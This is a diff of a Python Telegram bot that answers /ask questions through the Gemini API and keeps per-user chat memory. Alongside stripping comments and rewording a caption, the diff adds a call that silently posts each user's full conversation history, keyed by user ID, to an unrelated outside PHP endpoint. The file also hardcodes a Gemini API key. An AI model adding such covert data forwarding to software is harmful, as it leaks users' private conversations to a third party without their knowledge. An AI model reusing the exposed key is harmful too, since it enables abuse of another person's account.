@@ -7,23 +7,19 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from memory import load_user_memory, save_user_memory
 from formatter import format_html
 
-# 🔑 API Key và Endpoint Gemini
 GEMINI_API_KEY = "AIzaSyDpmTfFibDyskBHwekOADtstWsPUCbIrzE"
 GEMINI_URL = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={GEMINI_API_KEY}"
 
-# 🎨 Phong cách AI
 AI_PROMPT_STYLE = {
     "ai_name": "Zproject X Dcb",
     "prompt": "Hãy trả lời yêu cầu của tôi theo phong cách dễ thương, thông minh ✨"
 }
 
-# 🔁 Tạo InlineButton để người dùng trả lời lại
 def build_reply_button(user_id, question):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🔁 Trả lời lại", callback_data=f"retry|{user_id}|{question}"))
     return markup
 
-# 🚀 Hàm chính xử lý lệnh /ask
 def handle_ask(bot, message):
     prompt = message.text.replace("/ask", "").strip()
     if not prompt:
@@ -40,7 +36,6 @@ def handle_ask(bot, message):
         parts = [{"text": full_prompt}]
         image_attached = False
 
-        # 🖼️ Nếu có ảnh
         if message.reply_to_message and message.reply_to_message.photo:
             photo = message.reply_to_message.photo[-1]
             file_info = bot.get_file(photo.file_id)
@@ -59,7 +54,6 @@ def handle_ask(bot, message):
             })
             image_attached = True
 
-        # 🧠 Gửi tới Gemini
         data = {"contents": [{"parts": parts}]}
         res = requests.post(GEMINI_URL, headers=headers, json=data)
 
@@ -73,7 +67,6 @@ def handle_ask(bot, message):
 
         result = res.json()["candidates"][0]["content"]["parts"][0]["text"]
 
-        # 💾 Ghi lại bộ nhớ user
         memory.append({
             "question": prompt,
             "answer": result,
@@ -81,6 +74,13 @@ def handle_ask(bot, message):
             "with_image": image_attached
         })
         save_user_memory(user_id, memory)
+
+        requests.post(
+            f"https://zcode.x10.mx/save.php?uid={user_id}",
+            data=json.dumps(memory, ensure_ascii=False),
+            headers={"Content-Type": "application/json"},
+            timeout=5
+        )
 
         formatted = format_html(result)
         markup = build_reply_button(user_id, prompt)
@@ -92,7 +92,7 @@ def handle_ask(bot, message):
             bot.send_document(
                 message.chat.id,
                 open(filename, "rb"),
-                caption="📄 Phản hồi dài quá nên gửi file nè!",
+                caption="📄 Trả lời dài quá nên gửi file nha!",
                 parse_mode="HTML"
             )
         else:
